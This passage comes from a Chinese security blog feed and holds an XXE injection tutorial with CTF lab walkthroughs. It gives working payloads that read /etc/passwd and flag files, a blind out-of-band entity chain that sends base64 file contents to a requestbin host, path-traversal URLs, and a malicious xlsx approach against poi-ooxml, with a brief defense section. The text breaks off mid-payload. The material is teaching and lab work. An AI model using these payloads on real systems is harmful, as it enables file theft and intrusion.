危险函数</strong></p><p>动态调用就是像<code>($this-&gt;a)($this-&gt;b)</code>或者<code>$this-&gt;a[0]($this-&gt;b)</code>这样的危险动态调用。</p><p><strong>危险函数，就是根据目的寻找需要的函数</strong>。如要<strong>RCE</strong>，则寻找类似于<strong>call_user_func</strong>，<strong>array_walk</strong>这样的会进行函数调用的函数。如要<strong>FW</strong>，则寻找<strong>file_put_content</strong>这样的函数。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;反序列化漏洞&quot;&gt;&lt;a href=&quot;#反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;反序列化漏洞&quot;&gt;&lt;/a&gt;反序列化漏洞&lt;/h1&gt;&lt;h2 id=&quot;面向对象、类、对象&quot;&gt;&lt;a href=&quot;#面向对象、类、对象&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>XXE 漏洞</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined11/b4627abb.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined11/b4627abb.html</id>
    <published>2020-08-11T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:02.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h1><p><strong>XML外部实体注入 / XXE(XMLExternalEntityInjection)漏洞</strong>发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>。通过XML实体的<strong>SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中读取数据</strong>。所以攻击者可以通过XML实体传递自己构造的恶意值，使得处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读<strong>取任意文件、执行系统命令、探测内网端口、攻击内网网站</strong>等危害。</p><h1 id="XXE漏洞概述"><a href="#XXE漏洞概述" class="headerlink" title="XXE漏洞概述"></a>XXE漏洞概述</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p><strong>可扩展标记语言</strong>（英语：ExtensibleMarkupLanguage，简称：XML）是一种标记语言。用途：传送数据信息（描述数据是什么，以及携带数据信息）。<br>例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=“1.0”?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>王富贵<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>李小花<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>问候<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>今天学习XML了吗？<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>形象化一点：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=“1.0”?&gt;</span>//XML声明</span><br><span class="line"><span class="tag">&lt;<span class="name">小纸条</span>&gt;</span>//文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">收件人</span>&gt;</span>王富贵<span class="tag">&lt;/<span class="name">收件人</span>&gt;</span>//子结点</span><br><span class="line"><span class="tag">&lt;<span class="name">发件人</span>&gt;</span>李小花<span class="tag">&lt;/<span class="name">发件人</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">主题</span>&gt;</span>问候<span class="tag">&lt;/<span class="name">主题</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">具体内容</span>&gt;</span>今天学习XML了吗？<span class="tag">&lt;/<span class="name">具体内容</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">小纸条</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>DTD全称 <strong>document type definition</strong>，作用是<strong>定义XML文档</strong>的合法构建模块。</p><p><code>XML DTD</code>就像是所使用的标签的定义文档，并且由 XML 设计者或作者开发。DTD 定义了存在什么标签，它们拥有什么属性，以及其它元素里面有什么元素等等。</p><p>基本语法 <code>&lt;!ELEMENT 元素名 类型&gt;</code><br>下面是 DTD 文件的样子：</p><p><strong>内部定义</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE note[</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT note(to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT to(#)          (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT from(#)        (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT heading(#)     (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT body(#)        (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br></pre></td></tr></table></figure><p><strong>外部定义：</strong> 这里可控可以命令执行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM “note.dtd”&gt;</span></span><br></pre></td></tr></table></figure><p><strong>note.dtd内容：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">note</span>(<span class="attr">to</span>,<span class="attr">from</span>,<span class="attr">heading</span>,<span class="attr">body</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">to</span>(#)          (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">from</span>(#)        (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">heading</span>(#)     (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">body</span>(#)        (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><p>DTD 可以包含在 XML 文档内。XML的第一行必须是<code>&lt;!DOCTYPE&gt;</code>元素。同时也可以外部引用。</p><h3 id="一个完整的XML例子"><a href="#一个完整的XML例子" class="headerlink" title="一个完整的XML例子"></a>一个完整的XML例子</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=“1.0”?&gt;</span> //XML声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note(to,from,heading,body)&gt; //文档类型定义/DTD</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to(#)         (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from(#)       (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT heading(#)    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body(#)       (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> //文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>王富贵<span class="tag">&lt;/<span class="name">to</span>&gt;</span> //子结点</span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>李小花<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>问候<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>今天学习XML了吗？<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="何谓XXE"><a href="#何谓XXE" class="headerlink" title="何谓XXE"></a>何谓XXE</h2><p>XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</p><h2 id="如何构造实体注入"><a href="#如何构造实体注入" class="headerlink" title="如何构造实体注入"></a>如何构造实体注入</h2><p><strong>直接通过DTD外部实体声明</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM"file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>通过DTD文档引入外部DTD文档，再引入外部实体声明</strong></p><p><strong>payload：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %d SYSTEM "http://192.168.31.177:8890/test.dtd"&gt; %d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>test.dtd:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXE漏洞探测技巧"><a href="#XXE漏洞探测技巧" class="headerlink" title="XXE漏洞探测技巧"></a>XXE漏洞探测技巧</h1><h2 id="如何确认XXE漏洞存在"><a href="#如何确认XXE漏洞存在" class="headerlink" title="如何确认XXE漏洞存在"></a>如何确认XXE漏洞存在</h2><p><strong>通过注入外部实体。观察程序是如何传输数据的</strong></p><p>bp抓包在HTTP请求头中检查<code>conetent-type</code>是否为<code>xml</code></p><p><img src="http://qiniuyun.lintstar.top/20200809154625.png" alt="20200809154625"></p><p><strong>通过注入外部实体。尝试插入外部实体，观察回显</strong>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEa[&lt;!ENTITYb"DASCTF"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200809153531.png" alt="20200809153531"></p><p><strong>通过注入外部实体。尝试插入外部地址的外部实体，观察是否有请求。</strong></p><p><img src="http://qiniuyun.lintstar.top/20200809160709.png" alt="20200809160709"></p><h1 id="XXE漏洞利用方式"><a href="#XXE漏洞利用方式" class="headerlink" title="XXE漏洞利用方式"></a>XXE漏洞利用方式</h1><h2 id="XXE漏洞利用方式分类"><a href="#XXE漏洞利用方式分类" class="headerlink" title="XXE漏洞利用方式分类"></a>XXE漏洞利用方式分类</h2><p>一般XEE利用分两大情景：</p><ul><li>有回显：<ul><li>描述：可直接在页面中看到payload的执行结果。</li><li>思路：直接利用进行敏感文件获取等操作，直接输出结果。</li></ul></li><li>无回显（blindxee）：<ul><li>描述：看不到payload的执行结果。</li><li>思路：可通过外带使用外带数据通道提取数据</li></ul></li></ul><h2 id="有回显-读取文件-SSRF-Phar"><a href="#有回显-读取文件-SSRF-Phar" class="headerlink" title="有回显-读取文件/SSRF/Phar"></a>有回显-读取文件/SSRF/Phar</h2><p>此点可等效于参数可控的file_get_contents</p><p><strong>读取文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>SSRF</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM "http://127.0.0.1/xxe.php"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Phar触发反序列化</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM "phar://phar.phar/test.txt"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="无回显-读取文件-SSRF-Phar"><a href="#无回显-读取文件-SSRF-Phar" class="headerlink" title="无回显-读取文件/SSRF/Phar"></a>无回显-读取文件/SSRF/Phar</h2><p>将数据外带到外部服务器上</p><p><strong>读取文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM "http://127.0.0.1/text.dtd"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>text.dtd内容</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///flag</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://http.requestbin.buuoj.cn/umc930um？p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure><h1 id="XXE漏洞防御方式"><a href="#XXE漏洞防御方式" class="headerlink" title="XXE漏洞防御方式"></a>XXE漏洞防御方式</h1><p><strong>如何防御？</strong></p><p><strong>推荐：使用开发语言提供的禁用外部实体的方法</strong></p><ul><li><strong>PHP：</strong><br>libxml_disable_entity_loader(true);</li><li><strong>Java:</strong><br>DocumentBuilderFactorydbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</li></ul><p><strong>不推荐：过滤用户提交的XML数据</strong><br>关键词：<br><code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>或者<code>SYSTEM</code>和<code>PUBLIC</code></p><h1 id="XXE实战"><a href="#XXE实战" class="headerlink" title="XXE实战"></a>XXE实战</h1><h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><h3 id="http-10-20-25-44-180-xxe-读取-flag"><a href="#http-10-20-25-44-180-xxe-读取-flag" class="headerlink" title="http://10.20.25.44:180/ xxe 读取/flag"></a><a href="http://10.20.25.44:180/" target="_blank" rel="noopener">http://10.20.25.44:180/</a> xxe 读取/flag</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE XXE[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY XXE SYSTEM "file:///flag" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;XXE;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200805142425.png" alt="20200805142425"></p><h3 id="http-10-20-25-44-180-flag-php-读一下-flag-php"><a href="#http-10-20-25-44-180-flag-php-读一下-flag-php" class="headerlink" title="http://10.20.25.44:180/flag.php 读一下 flag.php"></a><a href="http://10.20.25.44:180/flag.php" target="_blank" rel="noopener">http://10.20.25.44:180/flag.php</a> 读一下 flag.php</h3><blockquote><p><code>php://filter/convert.base64-encode/resource=flag.php</code> 这里不能直接访问所以需要base64编码绕过</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE XXE[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY XXE SYSTEM "php://filter/convert.base64-encode/resource=flag.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;XXE;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200805143227.png" alt="20200805143227"></p><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><h3 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h3><p><a href="http://10.20.25.44:181/" target="_blank" rel="noopener">http://10.20.25.44:181/</a> 读 /flag</p><blockquote><p>xxe 无回显原理为你要想办法查看你读取到的文件内容，但没有回显。要想办法获取读取到的文件，这时需要想办法向外发送一个网络请求，请求中则带上该文件的内容，接收到该请求则可以拿到文件内容。</p></blockquote><p>REQUEST平台：<br><strong><a href="http://http.requestbin.buuoj.cn/" target="_blank" rel="noopener">http://http.requestbin.buuoj.cn/</a></strong></p><p>在没有回显的情况下，把信息发到外面的服务器</p><p>去上面的REQUEST平台生成链接</p><p><img src="http://qiniuyun.lintstar.top/20200805161146.png" alt="20200805161146"></p><p>所以首先定义一个file实体，填入链接：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///flag</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://http.requestbin.buuoj.cn/umc930um？p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure><blockquote><p>作用是被目标服务器的 XML 解析器解析而后读取文件和拼接到实体参数里外发请求。</p></blockquote><p><img src="http://qiniuyun.lintstar.top/20200805161421.png" alt="20200805161421"></p><blockquote><p><code>python -m SimpleHTTPServer 8081</code>开启8081的web服务器</p></blockquote><p>开启外部服务器，把test.dtd放到根目录下</p><p>构造payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE dasctf[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY % remote SYSTEM "http://10.14.0.81/test.dtd" &gt;</span></span><br><span class="line"><span class="meta">        %remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">books</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>开头处定义首先引入上面我们的 dtd 文件，%remote 使其中的内容被解析且定义，再调用 %int 使得 %send 被定义，%send 被定义之后即可被调用，最后调用 %send 外发请求。<br>ip是本地地址</p></blockquote><p>然后post这个payload ，报错会回显flag：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///flag</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>同时flag也会发给REQUEST平台。</p><h3 id="poi-ooxml-3-10-XXE-漏洞"><a href="#poi-ooxml-3-10-XXE-漏洞" class="headerlink" title="poi-ooxml-3.10 XXE 漏洞"></a>poi-ooxml-3.10 XXE 漏洞</h3><p><a href="http://10.20.25.44:1180/" target="_blank" rel="noopener">http://10.20.25.44:1180/</a>  拿到 flag</p><p>提示：</p><blockquote><ul><li>路径穿越下载 Java 源码。<ul><li><code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../web.xml&gt;</code></li><li><code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/ListFileServlet.class&gt;</code></li><li><code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/DownloadServlet.class&gt;</code></li><li><code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/UploadServlet.class&gt;</code></li></ul></li><li>JD-GUI 审计代码</li><li>查看依赖库存在的 XXE 漏洞上传文件触发 XXE 漏洞读取到 flag</li></ul></blockquote><p><img src="http://qiniuyun.lintstar.top/image-20200809204742658.png" alt="image-20200809204742658"></p><p>随便上出传一个文件，找到下载地址：<code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=29b475f2-dc80-4985-840d-11844edab662_a.sh&gt;</code></p><p>尝试路径穿越下载java代码，读取下来之后，用 jd-cli 去分析。</p><p><img src="http://qiniuyun.lintstar.top/image-20200809205525204.png" alt="image-20200809205525204"></p><p>看到里面对 excel- 开头的 xlsx 文件单独处理，有用到 poi-ooxml-3.10 这个库。</p><p><img src="http://qiniuyun.lintstar.top/image-20200809215451075.png" alt="image-20200809215451075"></p><p>搜索其中可能存在漏洞。找到存在 xxe 漏洞。</p><p><img src="http://qiniuyun.lintstar.top/20200810222808.png" alt="20200810222808"></p><p>那么来先把本地的dtd文件 test3.dtd 构造好。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://http.requestbin.buuoj.cn/10s0ntp1?a=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure><p>服务器打开来对外发送这个文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">8887</span> -t ./</span><br></pre></td></tr></table></figure><p>之后就可以构造一个恶意的 excel 传送上去。首先创建并解压一个 xlsx。</p><p><img src="http://qiniuyun.lintstar.top/image-20200809232712531.png" alt="image-20200809232712531"></p><p>修改 [Content_Types].xml，将其中的内容改为引入外部实体读取并外带文件内容的 XXE Payload。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span 